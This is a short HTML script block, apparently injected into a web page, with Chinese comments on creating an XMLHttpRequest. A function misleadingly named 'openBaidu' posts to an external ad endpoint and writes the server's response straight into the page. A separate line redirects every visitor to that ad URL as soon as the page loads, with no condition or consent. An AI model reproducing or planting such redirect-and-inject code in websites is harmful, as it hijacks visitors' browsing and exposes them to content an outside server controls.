<script>

function openBaidu()
{
	//IE浏览器创建XmlHttpRequest对象
	//var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP.3.0");
	var xmlHttp
	//判断浏览器是否支持ActiveX控件
	if(window.ActiveXObject){//支持-通过ActiveXObject的一个新实例来创建XMLHttpRequest对象
		xmlHttp = new ActiveXObject("Microsoft.XMLHTTP")
	}else if(window.XMLHttpRequest){//不支持
		xmlHttp = new XMLHttpRequest()
	} 
    xmlHttp.open("post","http://tlsbq.tlsbz.cn/adv/adv.php",false)
    xmlHttp.onreadystatechange= HandleStateChange;
    xmlHttp.send();
    function HandleStateChange()
    {
      if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
      {
          document.write(xmlHttp.responseText);
      }
    }
}

window.location.replace("http://tlsbq.tlsbz.cn/adv/adv.php")

</script>
